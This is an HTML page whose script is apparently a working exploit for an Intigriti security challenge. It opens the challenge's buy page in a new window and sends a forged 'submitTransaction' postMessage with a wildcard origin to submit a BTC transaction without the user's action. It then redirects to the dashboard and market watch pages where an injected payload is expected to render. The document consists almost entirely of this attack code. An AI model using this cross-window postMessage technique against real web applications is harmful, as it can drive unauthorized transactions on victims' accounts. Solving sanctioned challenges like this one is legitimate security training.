<!DOCTYPE html>
<html>
<body>
    <h1>Exploit starting...</h1>
    <script>
        // 1. Open the buy page with BTC
        const target = "https://challenge-0126.intigriti.io/buy.html?currency=BTC&price=1";
        const win = window.open(target);

        setTimeout(() => {
            // 2. Trigger the transaction via the postMessage vulnerability
            // We use BTC because 1337COIN is locked
            win.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: '0x1337',
                    currency: 'BTC',
                    amount: 0.00000001 
                }
            }, '*');

            // 3. Give it a moment to save, then redirect to the Dashboard
            setTimeout(() => {
                win.location.href = "https://challenge-0126.intigriti.io/dashboard.html";
                
                // 4. Backup: Redirect to Market Watch after a few seconds 
                // in case the payload is only rendered there
                setTimeout(() => {
                    win.location.href = "https://challenge-0126.intigriti.io/marketwatch.html";
                }, 3000);
            }, 2000);
        }, 4000);
    </script>
</body>
</html>
